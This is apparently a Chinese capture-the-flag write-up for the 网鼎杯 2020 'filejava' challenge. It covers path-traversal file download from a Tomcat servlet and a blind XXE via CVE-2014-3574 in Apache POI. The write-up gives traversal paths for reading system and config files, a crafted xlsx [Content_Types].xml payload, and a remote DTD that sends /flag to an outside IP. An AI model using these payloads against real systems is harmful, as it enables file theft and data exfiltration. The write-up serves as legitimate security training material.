# \[网鼎杯 2020 青龙组]filejava

## \[网鼎杯 2020 青龙组]filejava

## 考点

* 任意文件下载
* Java代码审计
* blind xxe
* CVE-2014-3574

## wp

文件上传功能，上传之后有个文件下载功能

![](<../.gitbook/assets/image (24) (1).png>)

![](<../.gitbook/assets/image (12) (1).png>)

有文件下载，尝试下载`/proc/self/cmdline`，多次测试发现下载链接是`../../../../../../../../../proc/self/cmdline`

![](<../.gitbook/assets/image (26).png>)

再读取`../../../../../../../../../proc/self/environ`

![](<../.gitbook/assets/image (34) (1).png>)

可以发现Tomcat的目录是`/usr/local/tomcat/`，可以读取Tomcat的`web.xml`，`../../../../../../../../../usr/local/tomcat/conf/web.xml`，它定义了系统的Servlet规范

然后读取web应用程序的web.xml，`../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml`，其中定义了web程序的Servlet规范

{% code title="WEB-INF/web.xml" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.DownloadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/DownloadServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>ListFileServlet</servlet-name>
        <servlet-class>cn.abc.servlet.ListFileServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>ListFileServlet</servlet-name>
        <url-pattern>/ListFileServlet</url-pattern>
    </servlet-mapping>

    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>UploadServlet</servlet-name>
        <url-pattern>/UploadServlet</url-pattern>
    </servlet-mapping>
</web-app>
```
{% endcode %}

依次下载源码，用jd-gui反编译得到源码

ListFileServlet是获取/WEB-INF/upload目录下的文件

DownloadServlet是下载filename传入的文件，它不能是空且不包含flag字符串，然后返回文件内容

{% code title="UploadServlet" %}
```java
......
        if (filename.startsWith("excel-") && "xlsx".equals(fileExtName))
          try {
            Workbook wb1 = WorkbookFactory.create(in);
            Sheet sheet = wb1.getSheetAt(0);
            System.out.println(sheet.getFirstRowNum());
          } catch (InvalidFormatException e) {
            System.err.println("poi-ooxml-3.10 has something wrong");
            e.printStackTrace();
          }  
......
```
{% endcode %}

代码中对上传文件做了判断，如果文件名以`excel-`开头，且以`xlsx`作为后缀，就使用`org.apache.poi.ss.usermodel.WorkbookFactory`类进行操作，这里是有个cve，即CVE-2014-3574。

新建`excel-test.xlsx`文件，然后解压

![](<../.gitbook/assets/image (37) (1).png>)

修改`[Content_Types].xml`为如下内容

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE convert [
<!ENTITY % remote SYSTEM "http://81.68.218.54:20010/file.dtd">
%remote;%int;%send;
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.printerSettings"/><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/worksheets/sheet2.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/worksheets/sheet3.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/><Override PartName="/xl/theme/theme1.xml" ContentType="application/vnd.openxmlformats-officedocument.theme+xml"/><Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/><Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/><Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/></Types>
```

vps上的dtd文件如下，再监听端口

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://81.68.218.54:20011?p=%file;'>">
```

然后重新打包为xlsx文件，这里就直接右键->7z打开压缩包，再右键编辑

![](<../.gitbook/assets/image (21) (1).png>)

保存直接上传即可

![](<../.gitbook/assets/image (36).png>)

## 小结

1. blind XXE
2. Tomcat目录结构
